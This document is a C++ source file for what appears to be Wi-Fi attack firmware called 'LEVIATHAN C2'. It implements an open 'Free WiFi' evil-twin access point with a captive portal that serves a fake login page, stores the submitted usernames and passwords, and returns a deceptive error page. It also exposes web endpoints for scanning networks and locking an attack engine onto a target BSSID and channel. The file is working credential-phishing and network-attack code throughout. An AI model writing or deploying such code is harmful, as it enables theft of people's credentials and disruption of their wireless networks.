/*
 * ======================================================================================
 * FILE: web_interface.cpp
 * DESCRIPTION: Web Implementation with Stack-Safe Buffer usage & Input Validation.
 * ======================================================================================
 */

#include "web_interface.h"
#include "attacks.h"
#include "hardware.h"

static bool parseBSSID(const char* str, uint8_t* out) {
    if (!str || strlen(str) != 17) return false;
    
    int v[6];
    if (sscanf(str, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) {
        return false;
    }
    
    for(int i=0; i<6; i++) out[i] = (uint8_t)v[i];
    return true;
}

WebInterface& WebInterface::getInstance() {
    static WebInterface instance;
    return instance;
}

WebInterface::WebInterface() : server(80), isEvilTwin(false) {}

void WebInterface::start(bool evilTwinMode) {
    isEvilTwin = evilTwinMode;
    WiFi.mode(evilTwinMode ? WIFI_AP : WIFI_AP_STA);
    
    if(evilTwinMode) {
        WiFi.softAP("Free WiFi", "");
        dnsServer.start(53, "*", WiFi.softAPIP());
    } else {
        // [Security] Use config credentials defined in config.h
        WiFi.softAP(WIFI_SSID_AP, WIFI_PASS_FALLBACK); 
    }
    
    //  Route Handlers
    server.on("/", [this](){ if(isEvilTwin) handleCaptivePortal(); else handleRoot(); });
    server.on("/login", HTTP_POST, [this](){ handleCaptivePortal(); }); 
    server.on("/api/scan", [this](){ handleScan(); });
    server.on("/api/attack", [this](){ handleAttack(); });
    server.on("/api/stop", [this](){ handleStop(); });
    server.onNotFound([this](){ if(isEvilTwin) handleCaptivePortal(); else server.send(404, "text/plain", "Not Found"); });
    
    server.begin();
    
    if (ENABLE_SERIAL_LOG) {
        Serial.print("[WEB] Started. Mode: ");
        Serial.println(evilTwinMode ? "EVIL TWIN" : "C2");
    }
}

void WebInterface::stop() {
    server.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    
    // Audit Log
    if (ENABLE_SERIAL_LOG) Serial.println("[WEB] Interface Halted.");
}

void WebInterface::update() {
    if(isEvilTwin) dnsServer.processNextRequest();
    server.handleClient();
}

void WebInterface::handleCaptivePortal() {
    if (server.method() == HTTP_POST) {
        if(server.hasArg("u") && server.hasArg("p")) {
            String u = server.arg("u");
            String p = server.arg("p");
            
            //  Overflow Protection
            const size_t MAX_CRED_LEN = 64; 
        
            if(u.length() + p.length() + 2 > MAX_CRED_LEN) {
                if (ENABLE_SERIAL_LOG) Serial.println("[WEB-WARN] Credential Overflow Attempt");
                server.send(400, "text/plain", "ERR_OVERFLOW");
                return;
            }

            char cred[MAX_CRED_LEN];
            snprintf(cred, sizeof(cred), "%s:%s", u.c_str(), p.c_str());
            
            Hardware::getInstance().saveCred(cred);
            
            // Deception Response
            server.send(200, "text/html", "<h1>Error 500: Service Unavailable</h1>");
        }
    } else {
        // Simple phishing template
        String html = "<!DOCTYPE html><html><body><h1>Login Required</h1><form method='POST' action='/login'><input type='text' name='u' placeholder='User'><br><input type='password' name='p' placeholder='Pass'><br><button>Login</button></form></body></html>";
        server.send(200, "text/html", html);
    }
}

void WebInterface::handleRoot() {
    server.send(200, "text/html", "<h1>LEVIATHAN C2</h1><button onclick=\"fetch('/api/stop')\">STOP OPERATIONS</button>");
}

void WebInterface::handleScan() {
    const size_t WEB_SCAN_LIMIT = 10;
    APInfo localBuf[WEB_SCAN_LIMIT]; 
    
    size_t count = AttackEngine::getInstance().scanNetworks(localBuf, WEB_SCAN_LIMIT);
    
    // Stream JSON construction to avoid huge String allocation
    String json = "[";
    for(size_t i=0; i<count; i++) {
        if(i>0) json += ",";
        json += "{\"s\":\"" + String(localBuf[i].ssid) + "\",";
        json += "\"b\":\"" + localBuf[i].getBSSIDString() + "\",";
        json += "\"r\":" + String(localBuf[i].rssi) + ",";
        json += "\"c\":" + String(localBuf[i].ch) + "}";
    }
    json += "]";
    
    server.send(200, "application/json", json);
}

void WebInterface::handleAttack() {
    if(server.hasArg("b") && server.hasArg("c")) {
        String bStr = server.arg("b");
        String cStr = server.arg("c");

        //  Input Validation
        
        // 1. Length Check
        if (bStr.length() != 17) {
            server.send(400, "text/plain", "ERR_BSSID_LEN");
            return;
        }

        // 2. Format & Type Parsing
        uint8_t bssid[6];
        if (!parseBSSID(bStr.c_str(), bssid)) {
            server.send(400, "text/plain", "ERR_BSSID_FMT");
            return;
        }

        // 3. Range Check
        int channel = cStr.toInt();
        if (channel < 1 || channel > 14) {
            server.send(400, "text/plain", "ERR_CHAN_RANGE");
            return;
        }

        // Apply Target Configuration
        AttackEngine::getInstance().setTarget(bssid, channel);
        
        if (ENABLE_SERIAL_LOG) {
            Serial.printf("[WEB] Target Locked: %s Ch:%d\n", bStr.c_str(), channel);
        }
        
        server.send(200, "text/plain", "TARGET_LOCKED");
    } else {
        server.send(400, "text/plain", "ERR_ARGS");
    }
}

void WebInterface::handleStop() {
    AttackEngine::getInstance().stopAttack();
    server.send(200, "text/plain", "HALTED");
}

void WebInterface::handleStatus() {
    // [TODO] Return JSON with Deauth Count and System State
    // Future expansion: serialize SystemState struct
    server.send(200, "application/json", "{\"status\":\"OK\"}");
}
